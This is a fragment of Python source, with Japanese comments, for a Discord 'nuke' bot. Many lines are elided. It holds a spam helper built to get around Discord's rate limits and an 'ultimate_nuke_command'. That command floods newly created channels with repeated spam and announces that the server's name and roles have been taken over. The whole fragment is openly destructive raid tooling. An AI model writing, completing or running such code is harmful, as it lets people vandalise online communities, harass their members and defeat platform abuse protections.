...
# ----------------------------------------------------
# --- 💀 メッセージスパムヘルパー機能 (レート制限対策) ---
# ----------------------------------------------------

async def send_spam_message_with_delay(channel, content):
    """チャンネルにメッセージを送信し、ランダムな極小遅延を挟む（レート制限対策）"""
    try:
        ...
        logging.warning(f"TEXT TERROR: チャンネル {channel.name} にメッセージを送信した！")
        return True
    except discord.HTTPException as e:
        if e.status == 429:
        ...
        logging.error(f"TEXT TERROR: メッセージ送信中に予期せぬエラーが発生: {e}")
        return False
...
async def ultimate_nuke_command(ctx): 
    ...
    # 3. 全ての新しいチャンネルに 純粋なテキストスパム を15回、レート制限対策を施して送信
    if successful_channels:
        ...
        for j in range(spam_count):
            ...
            try:
                ...
                logging.warning(f"テキストスパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
    ...
    if successful_channels:
        await successful_channels[0].send(
            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**サーバー名、ロール、そして最高にイカれたスパムメッセージで完全に汚染された**！\n"
